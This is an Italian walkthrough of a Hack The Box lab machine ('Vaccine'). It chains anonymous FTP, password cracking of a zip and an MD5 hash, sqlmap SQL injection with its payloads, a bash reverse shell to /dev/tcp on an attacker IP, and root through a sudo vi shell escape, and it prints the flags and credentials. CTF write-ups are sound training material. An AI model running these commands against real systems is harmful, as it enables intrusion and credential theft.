@@ -1,0 +1,280 @@
+IP: 10.129.123.133
+------------------
+nmap e output su file
+sudo nmap -sC -sV -oN scan 10.129.123.133
+
+vedo aperto un servizio ftp (21) con Anonymous login consentito, un servizio http (80) e un servizio ssh (22)
+----------
+mi collego con ftp alla porta 21, uso username anonymous e la password a caso (Anonymous login consentito)
+
+ftp 10.129.123.133
+Connected to 10.129.123.133.
+220 (vsFTPd 3.0.3)
+Name (10.129.123.133:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+vedo un file solo e lo scarico
+
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+--------------
+provo a aprire l'archivio ma mi richiede una password che non so
+--------
+utilizzo john the ripper per convertire lo zip in un hash e craccare la password
+
+zip2john backup.zip > hashes 
+
+ora tramite la wordlist rockyou trovo la password: 741852963
+
+john -w=/usr/share/wordlists/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)     
+1g 0:00:00:00 DONE (2022-08-03 09:52) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..hawkeye
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+-------------------
+apro l'archivio con la password appena ottenuta, trovo 2 files style.css e index.php
+dal file index.php vedo questa riga
+
+if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") 
+ 
+in cui viene specificato un username: admin e una password criptata
+--------------
+cerco di capire il tipo di hash tramite il seguente tool
+
+hashid 2cb42f8734ea607eefed3b70af13bbd3
+Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x 
+
+mi salvo l'hash in un file e provo con MD5
+---------------
+con hascat provo a craccarla
+
+hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-AMD Ryzen 9 3900X 12-Core Processor, 1438/2940 MB (512 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+2cb42f8734ea607eefed3b70af13bbd3:qwerty789                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
+Time.Started.....: Wed Aug  3 10:00:53 2022 (0 secs)
+Time.Estimated...: Wed Aug  3 10:00:53 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   822.7 kH/s (0.15ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 101376/14344385 (0.71%)
+Rejected.........: 0/101376 (0.00%)
+Restore.Point....: 99840/14344385 (0.70%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: shunda -> ilovehim123
+Hardware.Mon.#1..: Util: 18%
+
+Started: Wed Aug  3 10:00:22 2022
+Stopped: Wed Aug  3 10:00:55 2022
+
+ottengo un risultato: qwerty789
+--------
+mi dirigo sul sito dato che è presente un servizio http e mi collego con le credenziali appena ottenute
+è presente una lista della macchine senza nulla di speciale che però potrebbe essere collegata ad un database
+
+effettuo una query a caso ("ll") e vedo la presenza del '?' identificativo di sql
+http://10.129.123.133/dashboard.php?search=ll
+-----------
+per usare il tool sqlmap per verificare le vulnerabilità devo dargli URL e anche il SSID del cookie dell'autenticazione 
+
+sqlmap -u 'http://10.129.123.133/dashboard.php?search=ll' --cookie="PHPSESSID=adg80qtm4nomj4844dpccfoasj"
+
+[*] starting @ 10:11:25 /2022-08-03/
+
+[10:11:26] [INFO] testing connection to the target URL
+[10:11:26] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:11:26] [INFO] testing if the target URL content is stable
+[10:11:26] [INFO] target URL content is stable
+[10:11:26] [INFO] testing if GET parameter 'search' is dynamic
+[10:11:26] [WARNING] GET parameter 'search' does not appear to be dynamic
+[10:11:26] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')                                                                                                            
+[10:11:27] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
+[10:11:27] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
+[10:11:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:11:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:11:36] [INFO] testing 'Generic inline queries'
+[10:11:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[10:11:37] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable                                                                                                  
+[10:11:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[10:11:37] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[10:11:37] [INFO] testing 'PostgreSQL inline queries'
+[10:11:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[10:11:37] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)            
+[10:11:48] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[10:11:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[10:11:59] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[10:11:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=ll' AND (SELECT (CASE WHEN (5509=5509) THEN NULL ELSE CAST((CHR(82)||CHR(116)||CHR(121)||CHR(90)) AS NUMERIC) END)) IS NULL-- voth
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=ll' AND 3716=CAST((CHR(113)||CHR(113)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3716=3716) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC)-- wcjf
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=ll';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=ll' AND 6026=(SELECT 6026 FROM PG_SLEEP(5))-- VLwP
+---
+[10:12:12] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[10:12:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.123.133'
+
+[*] ending @ 10:12:13 /2022-08-03/
+
+di tutto questo output ci interessa la riga 179 "GET parameter 'search' is vulnerable."
+---------
+rieseguo ancora una volta lo script specificando --os-shell il quele mi permette di acere una shell per una command injection
+
+sqlmap -u 'http://10.129.123.133/dashboard.php?search=ll' --cookie="PHPSESSID=adg80qtm4nomj4844dpccfoasj" --os-shell
+-----------
+abbiamo una shell ma si può migliorare.
+
+apro un netcat listener sulla porta 443 ( sudo nc -lvnp 443 ) ed eseguo questo scirpt nella shell 
+
+bash -c "bash -i >& /dev/tcp/10.10.16.89/443 0>&1"
+
+su netcat ricevo la shell
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+
+ora la volgio rendere interattiva a pieno
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+-------------
+sotto "postgresql" trovo la user flag
+
+postgres@vaccine:/var/lib/postgresql$ cat user.txt 
+cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+-------
+cerco eventuali password nella cartella /var/www/html
+nel file dashboard.php trovo la seguente riga:
+
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+ottengo la password password=P@s5w0rd!
+---------
+ora posso collegarmi tramite ssh dato che so username e password
+
+ssh postgres@10.129.174.123 
+------------------------
+ora provo a vedere che privilegi ho con l'account 
+
+sudo -l
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+vedo che posso modificare un file pg_hba.cong
+-------
+apro il file con vi
+
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+tramite i ':' eseguo delle itruzioni dentro a vi
+:set shell=/bin/sh
+:shell
+
+questo mi crea una shell interattiva con i privilegi di root dato che mi sono concessi per modificare il file 
+-----
+trovo la flag sotto
+
+# whoami
+root
+# cd /root
+# ls
+pg_hba.conf  root.txt  snap
+# cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+# 
+
